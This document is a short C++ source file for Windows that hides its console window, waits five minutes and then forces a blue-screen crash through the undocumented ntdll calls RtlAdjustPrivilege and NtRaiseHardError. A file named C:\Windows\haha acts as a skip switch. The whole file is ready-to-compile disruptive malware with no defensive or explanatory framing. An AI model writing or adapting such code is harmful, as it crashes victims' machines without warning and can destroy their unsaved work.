#include <iostream>
#include <Windows.h>
#include <ntstatus.h>
#include <fstream>
#include <tchar.h>

using namespace std;

#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6

typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege) (
	ULONG privilege,
	BOOLEAN enable,
	BOOLEAN current_thread,
	PBOOLEAN enabled);
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(
	NTSTATUS error_status,
	ULONG number_of_parameters,
	ULONG unicode_string_parameter_mask,
	PULONG_PTR parameters,
	ULONG response_option,
	PULONG reponse);

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	SetConsoleTitle(TEXT("Blue Sreen of Death"));
	string hh = "C:\\Windows\\haha";
	if (fstream{hh}) {
		ShowWindow(GetConsoleWindow(), SW_RESTORE);
		system("echo You survive!");
		return 0;
	}
	else {
		Sleep(300000);
		pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
		BOOLEAN enabled;
		if (RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &enabled) == 0)
		{
			pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtRaiseHardError");
			ULONG response;
			NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, 0, OPTION_SHUTDOWN, &response);
		}
	}
}